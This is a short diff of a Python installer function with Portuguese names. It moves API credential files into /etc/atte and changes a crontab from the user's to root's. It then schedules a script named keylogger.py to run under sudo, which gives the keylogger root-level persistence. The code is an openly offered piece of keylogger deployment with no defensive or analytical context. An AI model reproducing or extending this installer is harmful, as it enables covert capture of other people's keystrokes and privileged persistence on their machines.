@@ -15,7 +15,7 @@ def instalar():
     os.system(f'sudo mv {diretorio_atual}/client_secrets.json /etc/atte')
     os.system(f'sudo mv {diretorio_atual}/credentials.json /etc/atte')
     os.system(f'sudo mv {diretorio_atual}/settings.yaml /etc/atte')
-    cron = CronTab(user=True)
+    cron = CronTab(user='root')
 
 # adicionar uma nova tarefa ao crontab
     job = cron.new(command='sudo /usr/bin/python3 /etc/atte/keylogger.py')
